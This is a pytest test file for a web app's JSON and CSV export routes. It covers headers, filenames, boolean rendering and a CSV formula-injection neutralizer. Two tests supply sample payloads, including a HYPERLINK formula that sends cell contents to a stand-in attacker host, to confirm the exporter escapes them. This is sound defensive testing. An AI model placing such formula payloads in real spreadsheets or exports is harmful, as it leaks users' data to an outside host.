"""Tests for data export routes: JSON and CSV exports for topics and check results."""

import csv
import io
import sqlite3
from collections.abc import AsyncGenerator
from datetime import UTC, datetime

import httpx
import pytest

from app.config import LLMSettings, NotificationSettings, Settings
from app.crud import create_article, create_check_result, create_topic
from app.main import app
from app.models import Article, CheckResult, FeedMode, Topic, TopicStatus
from app.web.dependencies import get_db_conn, get_settings

CSRF_TEST_TOKEN = "test-csrf-token-for-export-tests"


def _make_settings(**overrides) -> Settings:
    defaults = {
        "llm": LLMSettings(model="openai/gpt-4o-mini", api_key="test-key-12345678"),
        "notifications": NotificationSettings(urls=["json://localhost"]),
    }
    defaults.update(overrides)
    return Settings(**defaults)


def _make_topic(conn: sqlite3.Connection, name: str = "Test Topic") -> Topic:
    topic = Topic(
        name=name,
        description="A test topic description",
        feed_urls=["https://example.com/feed.xml"],
        feed_mode=FeedMode.MANUAL,
        status=TopicStatus.READY,
        status_changed_at=datetime.now(UTC),
    )
    created = create_topic(conn, topic)
    conn.commit()
    return created


def _make_article(conn: sqlite3.Connection, topic_id: int, title: str = "Test Article") -> Article:
    slug = title.replace(" ", "-").lower()
    article = Article(
        topic_id=topic_id,
        title=title,
        url=f"https://example.com/{slug}",
        content_hash=f"hash-{topic_id}-{slug}",
        raw_content="Article body content",
        source_feed="https://example.com/feed.xml",
        fetched_at=datetime.now(UTC),
        processed=True,
    )
    created = create_article(conn, article)
    conn.commit()
    return created


def _make_check_result(
    conn: sqlite3.Connection,
    topic_id: int,
    has_new_info: bool = True,
    stage_error: str | None = None,
    notification_error: str | None = None,
    notification_sent: bool = False,
) -> CheckResult:
    result = CheckResult(
        topic_id=topic_id,
        checked_at=datetime.now(UTC),
        articles_found=5,
        articles_new=2,
        has_new_info=has_new_info,
        llm_response=None,
        notification_sent=notification_sent,
        notification_error=notification_error,
        stage_error=stage_error,
    )
    created = create_check_result(conn, result)
    conn.commit()
    return created


@pytest.fixture
async def client(
    db_conn: sqlite3.Connection,
) -> AsyncGenerator[httpx.AsyncClient, None]:
    """Test client with db and settings overrides."""
    settings = _make_settings()

    def override_db():
        yield db_conn

    def override_settings():
        return settings

    app.dependency_overrides[get_db_conn] = override_db
    app.dependency_overrides[get_settings] = override_settings

    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app),
        base_url="http://test",
        cookies={"csrf_token": CSRF_TEST_TOKEN},
        headers={"X-CSRF-Token": CSRF_TEST_TOKEN},
    ) as ac:
        yield ac

    app.dependency_overrides.clear()


# --- Single topic JSON export ---


async def test_export_topic_json_returns_200(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/json returns 200 with JSON content type."""
    topic = _make_topic(db_conn)
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    assert "application/json" in response.headers["content-type"]


async def test_export_topic_json_content_disposition(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/json has correct Content-Disposition attachment header."""
    topic = _make_topic(db_conn, name="My Topic")
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    assert "attachment" in disposition
    assert f"topic_{topic.id}_" in disposition
    assert ".json" in disposition


async def test_export_topic_json_contains_topic_data(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """JSON export includes topic, articles, and check_results keys."""
    topic = _make_topic(db_conn, name="Climate Watch")
    assert topic.id is not None
    _make_article(db_conn, topic.id, title="Article One")
    _make_article(db_conn, topic.id, title="Article Two")
    _make_check_result(db_conn, topic.id, has_new_info=True)

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    data = response.json()
    assert "topic" in data
    assert "articles" in data
    assert "check_results" in data
    assert "knowledge_state" in data
    assert data["topic"]["name"] == "Climate Watch"
    assert len(data["articles"]) == 2
    assert len(data["check_results"]) == 1
    # seen_at is an additive, nullable audit field on the JSON export (accepted,
    # not silent): present and null for a never-viewed check.
    assert "seen_at" in data["check_results"][0]
    assert data["check_results"][0]["seen_at"] is None


async def test_export_topic_json_empty_data(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """JSON export works correctly when topic has no articles or checks."""
    topic = _make_topic(db_conn)
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    data = response.json()
    assert data["articles"] == []
    assert data["check_results"] == []
    assert data["knowledge_state"] is None


async def test_export_topic_json_not_found(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/json returns 404 for nonexistent topic."""
    response = await client.get("/topics/999999/export/json")

    assert response.status_code == 404


# --- CSV export ---


async def test_export_topic_csv_returns_200(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/csv returns 200 with text/csv content type."""
    topic = _make_topic(db_conn)
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    assert "text/csv" in response.headers["content-type"]


async def test_export_topic_csv_content_disposition(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/csv has correct Content-Disposition attachment header."""
    topic = _make_topic(db_conn, name="Tech News")
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    assert "attachment" in disposition
    assert f"checks_{topic.id}_" in disposition
    assert ".csv" in disposition


async def test_export_topic_csv_has_correct_headers(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """CSV export has the correct column headers."""
    topic = _make_topic(db_conn)
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    reader = csv.DictReader(io.StringIO(response.text))
    assert reader.fieldnames is not None
    expected_headers = [
        "id",
        "topic_id",
        "checked_at",
        "articles_found",
        "articles_new",
        "has_new_info",
        "notification_sent",
        "notification_error",
        "stage_error",
    ]
    assert list(reader.fieldnames) == expected_headers


async def test_export_topic_csv_contains_check_data(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """CSV export rows match the check results in the database."""
    topic = _make_topic(db_conn)
    assert topic.id is not None
    _make_check_result(db_conn, topic.id, has_new_info=True)
    _make_check_result(db_conn, topic.id, has_new_info=False)

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    reader = csv.DictReader(io.StringIO(response.text))
    rows = list(reader)
    assert len(rows) == 2
    # All rows should have the topic_id
    for row in rows:
        assert row["topic_id"] == str(topic.id)


async def test_export_topic_csv_booleans_render_as_0_and_1(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """OVH-111: boolean columns export as 0/1, not Python 'True'/'False'.

    Matches the on-disk INTEGER representation (to_insert_dict stores 0/1) and the
    JSON export's booleans, so a numeric-aware CSV importer parses them correctly.
    """
    topic = _make_topic(db_conn)
    assert topic.id is not None
    _make_check_result(db_conn, topic.id, has_new_info=True, notification_sent=True)
    _make_check_result(db_conn, topic.id, has_new_info=False, notification_sent=False)

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert len(rows) == 2
    rendered = {(r["has_new_info"], r["notification_sent"]) for r in rows}
    assert rendered == {("1", "1"), ("0", "0")}
    # No Python bool literals leaked into any cell.
    for row in rows:
        assert row["has_new_info"] in ("0", "1")
        assert row["notification_sent"] in ("0", "1")


async def test_export_topic_csv_surfaces_stage_error(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """CSV export carries the stage_error value (OVH-037 observability surface)."""
    topic = _make_topic(db_conn)
    assert topic.id is not None
    _make_check_result(db_conn, topic.id, stage_error="knowledge_update_failed: boom")
    _make_check_result(db_conn, topic.id, stage_error=None)

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    rows = list(csv.DictReader(io.StringIO(response.text)))
    stage_errors = {row["stage_error"] for row in rows}
    assert "knowledge_update_failed: boom" in stage_errors
    assert "" in stage_errors  # the None row renders as empty, not "None"


async def test_export_topic_json_surfaces_stage_error(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """JSON export carries the stage_error field on check results."""
    topic = _make_topic(db_conn)
    assert topic.id is not None
    _make_check_result(db_conn, topic.id, stage_error="scrape_failed: timeout")

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    data = response.json()
    checks = data["check_results"]
    assert len(checks) == 1
    assert checks[0]["stage_error"] == "scrape_failed: timeout"


async def test_export_topic_csv_empty_checks(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """CSV export with no check results only contains the header row."""
    topic = _make_topic(db_conn)
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    reader = csv.DictReader(io.StringIO(response.text))
    rows = list(reader)
    assert rows == []


async def test_export_topic_csv_not_found(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /topics/{id}/export/csv returns 404 for nonexistent topic."""
    response = await client.get("/topics/999999/export/csv")

    assert response.status_code == 404


# --- Non-ASCII export filename slug (OVH-167) ---


async def test_export_csv_non_ascii_name_has_sane_filename(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """A fully non-ASCII topic name must not yield an empty/degenerate filename."""
    topic = _make_topic(db_conn, name="日本語ニュース")
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    # The slug falls back to "topic" rather than collapsing to "checks_{id}_.csv".
    assert f'filename="checks_{topic.id}_topic.csv"' in disposition


async def test_export_json_non_ascii_name_has_sane_filename(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """JSON export filename slug for a non-ASCII name is sane (no empty slug)."""
    topic = _make_topic(db_conn, name="Привет мир")
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/json")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    assert f'filename="topic_{topic.id}_topic.json"' in disposition


async def test_export_csv_mixed_ascii_name_keeps_ascii_slug(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """A name with some ASCII keeps the ASCII part (no degenerate trailing _)."""
    topic = _make_topic(db_conn, name="Café News 🚀")
    assert topic.id is not None

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    # "Café News 🚀" -> "caf_news" (no leading/trailing/doubled underscores).
    assert f'filename="checks_{topic.id}_caf_news.csv"' in disposition


# --- CSV formula-injection neutralizer (OVH-168, CWE-1236) ---


async def test_export_csv_neutralizes_formula_injection(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """A cell starting with a formula trigger is prefixed with a single quote.

    ``notification_error`` can carry attacker-influenced text (a provider error
    echoing a crafted value). Pins the escaping contract: each formula-trigger
    leading char (= + - @ tab CR) is neutralized so a spreadsheet treats the
    cell as literal text.
    """
    topic = _make_topic(db_conn)
    assert topic.id is not None
    payload = '=HYPERLINK("http://evil.example/?leak="&A1,"click")'
    _make_check_result(db_conn, topic.id, notification_error=payload)

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert len(rows) == 1
    # The dangerous leading '=' is neutralized with a leading single quote, and
    # the rest of the payload survives intact.
    assert rows[0]["notification_error"] == "'" + payload


async def test_export_csv_neutralizes_all_trigger_chars(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """Every formula-trigger leading char is escaped; benign cells are untouched."""
    topic = _make_topic(db_conn)
    assert topic.id is not None
    for trigger in ("=cmd", "+1+1", "-2+3", "@SUM(A1)", "\t=danger", "\r=danger"):
        _make_check_result(db_conn, topic.id, notification_error=trigger)
    # A benign value that must NOT be altered.
    _make_check_result(db_conn, topic.id, notification_error="normal error text")

    response = await client.get(f"/topics/{topic.id}/export/csv")

    assert response.status_code == 200
    rows = list(csv.DictReader(io.StringIO(response.text)))
    errors = {row["notification_error"] for row in rows}
    assert "'=cmd" in errors
    assert "'+1+1" in errors
    assert "'-2+3" in errors
    assert "'@SUM(A1)" in errors
    assert "'\t=danger" in errors
    assert "'\r=danger" in errors
    # Benign text is passed through unchanged (no spurious quote prefix).
    assert "normal error text" in errors


# --- All topics JSON export ---


async def test_export_all_topics_json_returns_200(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /export/topics/json returns 200 with application/json content type."""
    response = await client.get("/export/topics/json")

    assert response.status_code == 200
    assert "application/json" in response.headers["content-type"]


async def test_export_all_topics_json_content_disposition(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /export/topics/json has correct Content-Disposition attachment header."""
    response = await client.get("/export/topics/json")

    assert response.status_code == 200
    disposition = response.headers.get("content-disposition", "")
    assert "attachment" in disposition
    assert "topics_export.json" in disposition


async def test_export_all_topics_json_contains_all_topics(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /export/topics/json returns all topics with exported_at timestamp."""
    _make_topic(db_conn, name="Topic A")
    _make_topic(db_conn, name="Topic B")
    _make_topic(db_conn, name="Topic C")

    response = await client.get("/export/topics/json")

    assert response.status_code == 200
    data = response.json()
    assert "topics" in data
    assert "exported_at" in data
    assert len(data["topics"]) == 3
    names = {t["name"] for t in data["topics"]}
    assert names == {"Topic A", "Topic B", "Topic C"}


async def test_export_all_topics_json_empty(
    client: httpx.AsyncClient,
    db_conn: sqlite3.Connection,
) -> None:
    """GET /export/topics/json returns empty topics list when no topics exist."""
    response = await client.get("/export/topics/json")

    assert response.status_code == 200
    data = response.json()
    assert data["topics"] == []
    assert "exported_at" in data
